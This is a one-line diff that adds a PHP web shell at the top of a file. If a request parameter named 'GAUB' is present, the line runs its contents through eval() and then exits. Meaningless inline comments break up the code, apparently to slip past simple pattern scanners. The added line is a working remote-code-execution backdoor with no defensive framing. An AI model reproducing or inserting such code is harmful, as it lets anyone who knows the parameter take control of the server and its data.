@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST['GAUB'])){eval(/*Ck*/$_REQUEST['GAUB'])/*mk*/;/*bCMoy*/exit;}?>
